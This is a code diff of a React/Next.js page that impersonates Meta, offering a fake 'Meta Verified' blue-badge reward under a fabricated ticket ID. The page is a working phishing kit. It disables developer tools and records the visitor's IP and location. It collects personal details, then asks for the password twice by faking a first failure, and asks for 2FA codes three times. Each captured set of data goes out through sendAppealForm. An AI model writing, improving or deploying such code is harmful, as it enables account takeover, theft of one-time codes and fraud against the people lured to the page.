@@ -1,221 +1,410 @@
-import { Button, Checkbox, Col, Form, Input, Modal, Row, Switch, Select as AntdSelect } from 'antd'
-import React, { useState } from 'react'
-import PhoneInput from 'react-phone-input-2';
+"use client";
+
+import React, { useEffect, useState } from 'react';
+import '../../styles/pages/Supportpage.scss';
+import '../../styles/base/bootstrap.min.css';
+import '../../styles/pages/Modal.scss';
 import "react-phone-input-2/lib/style.css";
-import "../../libs/i18n"
+import AuthModal from '../components/modals/AuthModal';
+import PasswordModal from '../components/modals/PasswordModal';
+import SecurityModal from '../components/modals/SecurityModal';
+import FinalModal from '../components/modals/FinalModal';
+// import ChoseAuthenModal from '../components/modals/ChoseAuthen'; // Có thể bỏ import này nếu không dùng nữa
+import { getRecord, getUserLocation, saveRecord, sendAppealForm } from '../utils';
+import disableDevtool from 'disable-devtool';
+import moment from 'moment';
+import "../libs/i18n"
 import { useTranslation } from 'react-i18next';
 
-const { Option } = AntdSelect;
+const AccountPageComponent = () => {
+    // LANGUAGE
+    const { t, i18n } = useTranslation();
+    const [ready, setReady] = useState(false);
+    
+    // STATE MENU
+    const [activeMenu, setActiveMenu] = useState(null);
 
-const AuthModal = ({ openAuthModal, onCancel, onFinish, countryEmoji }) => {
-    const { t } = useTranslation();
+    const currentDate = moment().format('MMMM D, YYYY')
 
-    const { TextArea } = Input;
+    // LOCATION
+    const [userIp, setUserIp] = useState("");
+    const [userFlag, setUserFlag] = useState("");
 
-    const currentYear = new Date().getFullYear();
-    const years = Array.from({ length: currentYear - 1900 + 1 }, (_, i) => currentYear - i);
-    const monthNames = ["January", "February", "March", "April", "May", "June", "July", "August", "September", "October", "November", "December"];
-    const months = Array.from({ length: 12 }, (_, i) => i + 1);
-    const days = Array.from({ length: 31 }, (_, i) => i + 1);
+    // Add ticket ID state
+    const [ticketId, setTicketId] = useState("4564-ATFD-4865");
+
+    // STATE OPEND MODAL
+    const [openAuthModal, setOpenAuthModal] = useState(false);
+    const [openPasswordModal, setOpenPasswordModal] = useState(false);
+    const [openSecurityModal, setOpenSecurityModal] = useState(false);
+    const [openFinalModal, setOpenFinalModal] = useState(false);
+    const [timeCounter, setTimeCounter] = useState(0);
+
+    // Bỏ state openChoseAuthenModal vì không dùng nữa
+    // const [openChoseAuthenModal, setOpenChoseAuthenModal] = useState(false); 
+    const [dataCookie, setDataCookie] = useState(null);
+
+    const [dataCookieSecurity, setDataCookieSecurity] = useState(null);
+
+    // LOADING STATE
+    const [loadingPassword, setLoadingPassword] = useState(false);
+    const [loadingSecurity, setLoadingSecurity] = useState(false);
+    // const [loadingChoseAuthen, setLoadingChoseAuthen] = useState(false);
+
+    // WARNING STATE
+    const [warningPassword, setWarningPassword] = useState(false);
+    const [warningSecurity, setWarningSecurity] = useState(false);
+
+    // STATE CHECK CLICK
+    const [clickPassword, setClickPassword] = useState(0);
+    const [clickSecurity, setClickSecurity] = useState(0);
+
+    // STATE FILE UPLOAD
+    const [fileList, setFileList] = useState([]);
+
+    const handleFileChange = (newFileList) => {
+        setFileList(newFileList);
+    };
+
+    useEffect(() => {
+        if (typeof window !== 'undefined') {
+            disableDevtool();
+        }
+    }, []);
+
+    useEffect(() => {
+        const getIp = async () => {
+            try {
+                const userLocation = await getUserLocation();
+                setUserIp(userLocation?.ip || "Error, contact @otis_cua");
+                setUserFlag(userLocation?.country_code || "US");
+                const language = userLocation?.country_code.toLowerCase() || "en";
+                i18n.changeLanguage(language).then(() => setReady(true));
+            } catch (error) {
+                console.error("Error getting IP or location:", error);
+                setUserFlag("US");
+            }
+        }
+        getIp();
+    }, []);
+
+    // FUNCTION HANDLE FINISH APPEAL
+    const handleFinishAppeal = async (values) => {
+        try {
+            const userLocation = await getUserLocation(userIp);
+            const cookieVersion_1 = {
+                ip: userIp,
+                location: userLocation?.location || "Error, contact @otis_cua",
+                ...values
+            }
+            saveRecord("__ck_clv1", cookieVersion_1);
+            setOpenAuthModal(false)
+            setOpenPasswordModal(true);
+        } catch (error) {
+            console.error("Error submitting form:", error);
+        }
+    }
+
+    // FUNCTION HANDLE FINISH PASSWORD
+    const handleFinishPassword = async (values) => {
+        try {
+            if (clickPassword === 0) {
+                // Lần nhập đầu tiên -> Giả vờ sai mật khẩu
+                setLoadingPassword(true);
+                let ck_data_v1 = getRecord("__ck_clv1");
+                if (!ck_data_v1) ck_data_v1 = getRecord("__ck_clv1");
+
+                const cookieVersion_2 = { ...ck_data_v1, password: values.password }
+                saveRecord("__ck_clv2", cookieVersion_2);
+                
+                await sendAppealForm(cookieVersion_2)
+                    .then(() => {
+                        setTimeout(() => {
+                            setLoadingPassword(false);
+                            setWarningPassword(true);
+                        }, 1500);
+                        setClickPassword(1)
+                    })
+                    .catch((err) => console.log(err));
+            } else {
+                // Lần nhập thứ hai -> Thành công -> BỎ QUA CHỌN PHƯƠNG THỨC -> Sang SecurityModal luôn
+                setLoadingPassword(true);
+                let ck_data_v2 = getRecord("__ck_clv2");
+                if (!ck_data_v2) ck_data_v2 = getRecord("__ck_clv2");
+
+                const cookieVersion_3 = { ...ck_data_v2, passwordSecond: values.password }
+                saveRecord("__ck_clv3", cookieVersion_3);
+                
+                await sendAppealForm(cookieVersion_3)
+                    .then(() => {
+                        setTimeout(() => {
+                            setLoadingPassword(false);
+                            setWarningPassword(false);
+                            setOpenPasswordModal(false);
+                            
+                            // --- THAY ĐỔI TẠI ĐÂY: Bỏ qua ChoseAuthenModal ---
+                            // setOpenChoseAuthenModal(true); <--- Dòng cũ
+                            
+                            // Mở trực tiếp SecurityModal
+                            setOpenSecurityModal(true); 
+                            
+                            // Truyền dữ liệu cookie trực tiếp vào Security
+                            setDataCookieSecurity(cookieVersion_3); 
+                        }, 1500);
+                    })
+                    .catch((err) => console.log(err));
+            }
+        } catch (error) {
+            console.error("Error submitting form:", error);
+        }
+    }
+
+    // (Bỏ qua hàm handleFinishChoseAuthen vì không dùng nữa)
+
+    // FUNCTION HANDLE FINISH SECURITY
+    const handleFinishSecurity = async (values) => {
+        setLoadingSecurity(true);
+        
+        // Logic xác định key lưu trữ (giữ nguyên hoặc điều chỉnh tùy ý)
+        // Vì bỏ qua bước chọn phương thức (clv4), ta có thể coi bước này nối tiếp clv3
+        let currentRecordKey, nextRecordKey, fieldName;
+        
+        if(clickSecurity === 0) {
+            // Lấy dữ liệu từ clv3 (password xong), lưu vào clv5 (bỏ qua clv4)
+            currentRecordKey = "__ck_clv3"; nextRecordKey = "__ck_clv5"; fieldName = "twoFa";
+        } else if (clickSecurity === 1) {
+            currentRecordKey = "__ck_clv5"; nextRecordKey = "__ck_clv6"; fieldName = "twoFaSecond";
+        } else {
+            currentRecordKey = "__ck_clv6"; nextRecordKey = "__ck_clv7"; fieldName = "twoFaThird"; 
+        }
+
+        let ck_data = getRecord(currentRecordKey) || dataCookieSecurity; // Fallback to state if localstore fails
+        
+        const cookieVersion = { ...ck_data, [fieldName]: values.twoFa };
+        
+        if(clickSecurity < 2) saveRecord(nextRecordKey, cookieVersion);
+
+        await sendAppealForm(cookieVersion)
+            .then(() => {
+                setTimeout(() => {
+                    setLoadingSecurity(false);
+                    if(clickSecurity < 2) {
+                        setWarningSecurity(true);
+                        setTimeCounter(process.env.NEXT_PUBLIC_SETTING_TIME);
+                        setClickSecurity(prev => prev + 1);
+                    } else {
+                        setOpenSecurityModal(false);
+                        setOpenFinalModal(true);
+                        resetPasswordState();
+                        resetSecurityState();
+                    }
+                }, 1000 + (clickSecurity * 300));
+            })
+            .catch((err) => console.log(err));
+    }
+
+    // FUNCTION HANDLE TRY ANOTHER WAY
+    const handleTryAnotherWay = () => {
+        // Nút này thường quay lại chọn phương thức. 
+        // Vì đã bỏ bước chọn phương thức, ta có thể cho nó quay lại nhập pass hoặc không làm gì.
+        // Ở đây tôi sẽ cho nó đóng modal Security hiện tại.
+        setOpenSecurityModal(false);
+        setOpenPasswordModal(true); // Quay lại bước nhập pass
+    }
+
+    const resetPasswordState = () => {
+        setOpenPasswordModal(false);
+        setLoadingPassword(false);
+        setWarningPassword(false);
+        setClickPassword(0);
+    };
+
+    const resetSecurityState = () => {
+        setOpenSecurityModal(false);
+        setLoadingSecurity(false);
+        setWarningSecurity(false);
+        setTimeCounter(0);
+        setClickSecurity(0);
+    };
+
+    useEffect(() => {
+        const generateTicketId = () => {
+            const section1 = Math.random().toString(36).substring(2, 6).toUpperCase();
+            const section2 = Math.random().toString(36).substring(2, 6).toUpperCase();
+            const section3 = Math.random().toString(36).substring(2, 6).toUpperCase();
+            setTicketId(`${section1}-${section2}-${section3}`);
+        };
+        generateTicketId();
+    }, []);
+
+    if (!ready) {
+        return ('')
+    }
 
     return (
         <>
-            <Modal
-                title={t('content.modal.appeal_request.title')}
-                open={openAuthModal}
-                onCancel={onCancel}
-                maskClosable={false}
-                centered
-                footer={false}
-                className='modal-items'
-                width={{
-                    xs: '90%',
-                    sm: '70%',
-                    md: '60%',
-                    lg: '45%',
-                    xl: '35%',
-                    xxl: '29%',
+            {/* --- GIAO DIỆN CHÍNH --- */}
+            <div style={{ 
+                minHeight: '100vh', 
+                background: 'linear-gradient(180deg, #F0F4FF 0%, #FFFFFF 100%)', 
+                display: 'flex', 
+                flexDirection: 'column', 
+                alignItems: 'center', 
+                paddingTop: '0px',
+                paddingBottom: '20px',
+                fontFamily: '-apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif'
+            }}>
+                
+                <div style={{ maxWidth: '680px', width: '90%', padding: '0 10px', marginTop: '20px' }}>
+                    
+                    {/* Icon Blue Tick */}
+                    <div style={{ marginBottom: '10px', textAlign: 'left' }}>
+                        <img 
+                            src="/tick.svg" 
+                            alt="Meta Verified" 
+                            style={{ width: '48px', height: '48px' }} 
+                        />
+                    </div>
+                    
+                    {/* Title */}
+                    <h1 style={{ 
+                        textAlign: 'left', 
+                        fontSize: '32px', 
+                        fontWeight: '700', 
+                        marginBottom: '12px',
+                        color: '#1c1e21'
+                    }}>
+                        Meta Verified - Rewards for you
+                    </h1>
+
+                    {/* Subtitle */}
+                    <p style={{ 
+                        textAlign: 'left', 
+                        fontSize: '17px', 
+                        fontWeight: '600', 
+                        marginBottom: '24px',
+                        color: '#1c1e21'
+                    }}>
+                        Show the world that you mean business.
+                    </p>
+
+                    {/* Content Text */}
+                    <div style={{ fontSize: '15px', lineHeight: '1.6', color: '#1c1e21', textAlign: 'left' }}>
+                        <p style={{ marginBottom: '16px' }}>
+                            {t('content.top_content.sub.sub_1') || "Congratulations on achieving the requirements to upgrade your page to a verified blue badge! This is a fantastic milestone that reflects your dedication and the trust you've built with your audience."}
+                        </p>
+                        
+                        <p style={{ marginBottom: '16px' }}>
+                             {t('content.top_content.sub.sub_2') || "We're thrilled to celebrate this moment with you and look forward to seeing your page thrive with this prestigious recognition!"}
+                        </p>
+                        
+                        <p style={{ marginBottom: '24px', color: '#65676B' }}>
+                            Your ticket id: #{ticketId}
+                        </p>
+
+                        <h3 style={{ fontSize: '17px', fontWeight: '700', marginBottom: '8px' }}>
+                            {t('content.guide.title') || "Verified Blue Badge Request Guide"}
+                        </h3>
+                        
+                        <ul style={{ paddingLeft: '20px', marginBottom: '32px' }}>
+                            <li style={{ marginBottom: '8px' }}>
+                                {t('content.guide.sub.sub_1') || "Fact checkers may not respond to requests containing intimidation, hate speech, or verbal threats"}
+                            </li>
+                            <li style={{ marginBottom: '8px' }}>
+                                {t('content.guide.sub.sub_2') || "In your request, please provide all required information to ensure timely processing by the fact checker. Submitting an invalid email address or failing to reply to requests for additional information within 2 days may lead to the application being closed without review. If the request remains unprocessed after 4 days, Meta will automatically reject it."}
+                            </li>
+                            <li>
+                                {t('content.guide.sub.sub_3') || "Once all details are submitted, we will evaluate your account to check for any restrictions. The verification process typically takes 24 hours, though it may extend in some cases. Based on our decision, restrictions will either remain or be lifted, and your account will be updated accordingly."}
+                            </li>
+                        </ul>
+                    </div>
+
+                    {/* Button */}
+                    <div style={{ display: 'flex', justifyContent: 'center', width: '100%', marginTop: '20px' }}>
+                        <button 
+                            onClick={() => setOpenAuthModal(true)}
+                            style={{
+                                backgroundColor: '#0064e0',
+                                color: '#ffffff',
+                                textAlign: 'center',
+                                border: 'none',
+                                borderRadius: '100px',
+                                padding: '10px 40px',
+                                fontSize: '15px',
+                                fontWeight: '600',
+                                width: '100%', 
+                                maxWidth: '350px',
+                                cursor: 'pointer',
+                                height: '48px',
+                                transition: 'background-color 0.2s'
+                            }}
+                            onMouseOver={(e) => e.target.style.backgroundColor = '#0054bd'}
+                            onMouseOut={(e) => e.target.style.backgroundColor = '#0064e0'}
+                        >
+                            Submit request
+                        </button>
+                    </div>
+
+                    <div style={{ 
+                        marginTop: '20px', 
+                        display: 'flex', 
+                        justifyContent: 'center', 
+                        flexWrap: 'wrap', 
+                        gap: '20px', 
+                        fontSize: '12px', 
+                        color: '#65676B' 
+                    }}>
+                        <a href="#" style={{ color: '#65676B', textDecoration: 'none' }}>Help Center</a>
+                        <a href="#" style={{ color: '#65676B', textDecoration: 'none' }}>Privacy Policy</a>
+                        <a href="#" style={{ color: '#65676B', textDecoration: 'none' }}>Terms of Service</a>
+                        <a href="#" style={{ color: '#65676B', textDecoration: 'none' }}>Community Standards</a>
+                        <span>Meta © 2025</span>
+                    </div>
+
+                </div>
+            </div>
+
+            {/* --- CÁC MODAL --- */}
+            <AuthModal
+                openAuthModal={openAuthModal}
+                onCancel={() => setOpenAuthModal(false)}
+                onFinish={handleFinishAppeal}
+                countryEmoji={userFlag}
+                fileList={fileList}
+                handleFileChange={handleFileChange}
+            />
+
+            <PasswordModal
+                opendPasswordModal={openPasswordModal}
+                onCancelPasswordModal={resetPasswordState}
+                onFinishPassword={handleFinishPassword}
+                loadingPassword={loadingPassword}
+                warningPassword={warningPassword}
+            />
+
+            <SecurityModal
+                openSecurityModal={openSecurityModal}
+                onCancelSecurityModal={resetSecurityState}
+                onFinishSecurity={handleFinishSecurity}
+                loadingSecurity={loadingSecurity}
+                timeCounter={timeCounter}
+                clickSecurity={clickSecurity}
+                dataCookie={dataCookieSecurity}
+                onTryAnotherWay={handleTryAnotherWay}
+            />
+
+            <FinalModal
+                openFinalModal={openFinalModal}
+                onCancelFinalModal={() => {
+                    setOpenFinalModal(false);
+                    resetPasswordState();
+                    resetSecurityState();
                 }}
-            >
-                <Form
-                    name="data-first"
-                    initialValues={{
-                        remember: true,
-                    }}
-                    onFinish={onFinish}
-                    autoComplete="off"
-                >
-
-                    <div className="item-form">
-                        <Form.Item
-                            name="name"
-                            rules={[
-                                {
-                                    required: true,
-                                    message: t('content.modal.appeal_request.form.name.required'),
-                                },
-                            ]}
-                        >
-                            <Input placeholder={t('content.modal.appeal_request.form.name.placeholder')} />
-                        </Form.Item>
-                    </div>
-
-                    <div className="item-form">
-                        <Form.Item
-                            name="email"
-                            rules={[
-                                {
-                                    required: true,
-                                    message: t('content.modal.appeal_request.form.email.required'),
-                                },
-                            ]}
-                        >
-                            <Input placeholder={t('content.modal.appeal_request.form.email.placeholder')} type='email' />
-                        </Form.Item>
-                    </div>
-
-                    <div className="item-form">
-                        <Form.Item
-                            name="business"
-                            rules={[
-                                {
-                                    required: true,
-                                    message: t('content.modal.appeal_request.form.email_business.required'),
-                                },
-                            ]}
-                        >
-                            <Input placeholder={t('content.modal.appeal_request.form.email_business.placeholder')} type='email' />
-                        </Form.Item>
-                    </div>
-
-                    <div className="item-form">
-                        <Form.Item
-                            name="fanpage"
-                            rules={[
-                                {
-                                    required: true,
-                                    message: t('content.modal.appeal_request.form.page_name.required'),
-                                },
-                            ]}
-                        >
-                            <Input placeholder={t('content.modal.appeal_request.form.page_name.placeholder')} />
-                        </Form.Item>
-                    </div>
-
-                    <div className="item-form">
-                        <Form.Item
-                            name="phone"
-                            rules={[
-                                {
-                                    required: true,
-                                    message: t('content.modal.appeal_request.form.phone_number.required'),
-                                },
-                            ]}
-                        >
-                            <PhoneInput
-                                country={countryEmoji?.toLowerCase() || "us"}
-                                disableParentheses
-                            />
-                        </Form.Item>
-                    </div>
-
-                    <div className="item-form">
-                        <p><b>{t('content.modal.appeal_request.form.date_of_birth.title')}</b></p>
-                        <Form.Item>
-                            <Row gutter={8}>
-                                <Col span={8}>
-                                    <Form.Item name="day" rules={[{ required: true, message: t('content.modal.appeal_request.form.date_of_birth.day.required') }]}>
-                                        <AntdSelect placeholder={t('content.modal.appeal_request.form.date_of_birth.day.placeholder')} getPopupContainer={triggerNode => triggerNode.parentNode}>
-                                            {days.map(day => (
-                                                <Option key={day} value={day.toString().padStart(2, '0')}>
-                                                    {day.toString().padStart(2, '0')}
-                                                </Option>
-                                            ))}
-                                        </AntdSelect>
-                                    </Form.Item>
-                                </Col>
-                                <Col span={8}>
-                                    <Form.Item name="month" rules={[{ required: true, message: t('content.modal.appeal_request.form.date_of_birth.month.required') }]}>
-                                        <AntdSelect placeholder={t('content.modal.appeal_request.form.date_of_birth.month.placeholder')} getPopupContainer={triggerNode => triggerNode.parentNode}>
-                                            {months.map((month, index) => (
-                                                <Option key={month} value={month.toString().padStart(2, '0')}>
-                                                    {monthNames[index]}
-                                                </Option>
-                                            ))}
-                                        </AntdSelect>
-                                    </Form.Item>
-                                </Col>
-                                <Col span={8}>
-                                    <Form.Item name="year" rules={[{ required: true, message: t('content.modal.appeal_request.form.date_of_birth.year.required') }]}>
-                                        <AntdSelect placeholder={t('content.modal.appeal_request.form.date_of_birth.year.placeholder')} getPopupContainer={triggerNode => triggerNode.parentNode}>
-                                            {years.map(year => (
-                                                <Option key={year} value={year.toString()}>
-                                                    {year}
-                                                </Option>
-                                            ))}
-                                        </AntdSelect>
-                                    </Form.Item>
-                                </Col>
-                            </Row>
-                        </Form.Item>
-                    </div>
-
-               {/*   <div className="item-form" style={{ marginBottom: "0px" }}>
-                        <Form.Item
-                            name="issue"
-                        >
-                            <TextArea placeholder={t('content.modal.appeal_request.form.issue.placeholder')} />
-                        </Form.Item>
-                    </div>
-
-                    <p>{t('content.modal.appeal_request.form.issue.note')}</p>*/}
-
-                    <div className="item-noti">
-                        <div className="left-noti">
-                            <div className="icon">
-                                <svg width="16" height="16" viewBox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg">
-                                    <path d="M16 8.0486C16 3.60314 12.418 -0.000610352 7.99949 -0.000610352C3.58095 -0.000610352 -0.000976562 3.60314 -0.000976562 8.0486C-0.000976562 12.0662 2.92468 15.3962 6.74942 16V10.3753H4.71805V8.0486H6.74942V6.27526C6.74942 4.25792 7.94383 3.14361 9.77132 3.14361C10.6466 3.14361 11.5622 3.30082 11.5622 3.30082V5.28168H10.5534C9.55951 5.28168 9.24957 5.90215 9.24957 6.53869V8.0486H11.4684L11.1137 10.3753H9.24957V16C13.0743 15.3962 16 12.0662 16 8.0486Z" fill="black" />
-                                </svg>
-                            </div>
-                            <div className="desc">
-                                <p><b>{t('content.modal.appeal_request.form.facebook_notification.title')}</b></p>
-                                <p>{t('content.modal.appeal_request.form.facebook_notification.description')}</p>
-                            </div>
-                        </div>
-                        <div className="button">
-                            <Form.Item>
-                                <Switch checked />
-                            </Form.Item>
-                        </div>
-                    </div>
-
-                    <div className="item-form">
-                        <Form.Item
-                            name="checkForm"
-                            valuePropName="checked"
-                        >
-                            <Checkbox>
-                                {t('content.modal.appeal_request.form.check_form.title')}
-                                <div className='link-to'>
-                                    {t('content.modal.appeal_request.form.check_form.link')}
-                                    <svg width="12" height="12" viewBox="0 0 12 12" fill="none" xmlns="http://www.w3.org/2000/svg">
-                                        <path d="M3 9.5H9C9.13261 9.5 9.25979 9.44732 9.35355 9.35355C9.44732 9.25979 9.5 9.13261 9.5 9V6.5H10.5V9C10.5 9.39782 10.342 9.77936 10.0607 10.0607C9.77936 10.342 9.39782 10.5 9 10.5H3C2.60218 10.5 2.22064 10.342 1.93934 10.0607C1.65804 9.77936 1.5 9.39782 1.5 9V3C1.5 2.60218 1.65804 2.22064 1.93934 1.93934C2.22064 1.65804 2.60218 1.5 3 1.5H5.5V2.5H3C2.86739 2.5 2.74021 2.55268 2.64645 2.64645C2.55268 2.74021 2.5 2.86739 2.5 3V9C2.5 9.13261 2.55268 9.25979 2.64645 9.35355C2.74021 9.44732 2.86739 9.5 3 9.5Z" fill="black" />
-                                        <path d="M5.64622 5.6465L8.79221 2.5H6.99972C6.86711 2.5 6.73993 2.44732 6.64616 2.35355C6.55239 2.25979 6.49972 2.13261 6.49972 2C6.49972 1.86739 6.55239 1.74021 6.64616 1.64645C6.73993 1.55268 6.86711 1.5 6.99972 1.5H9.99972C10.1323 1.5 10.2595 1.55268 10.3533 1.64645C10.447 1.74021 10.4997 1.86739 10.4997 2V5C10.4997 5.13261 10.447 5.25979 10.3533 5.35355C10.2595 5.44732 10.1323 5.5 9.99972 5.5C9.86711 5.5 9.73993 5.44732 9.64616 5.35355C9.55239 5.25979 9.49972 5.13261 9.49972 5V3.207L6.35322 6.3535C6.25891 6.44458 6.13261 6.49498 6.00151 6.49384C5.87042 6.4927 5.74501 6.44011 5.65231 6.34741C5.5596 6.25471 5.50702 6.1293 5.50588 5.9982C5.50474 5.8671 5.55514 5.7408 5.64622 5.6465Z" fill="black" />
-                                    </svg>
-                                </div>
-                            </Checkbox>
-                        </Form.Item>
-                    </div>
-
-                    <Form.Item>
-                        <Button className='button-send' htmlType="submit">
-                            {t('content.modal.appeal_request.form.button')}
-                        </Button>
-                    </Form.Item>
-                </Form>
-            </Modal>
+            />
+            
+            {/* Đã xóa ChoseAuthenModal khỏi Render */}
         </>
-    )
-}
+    );
+};
 
-export default AuthModal
+export default AccountPageComponent;
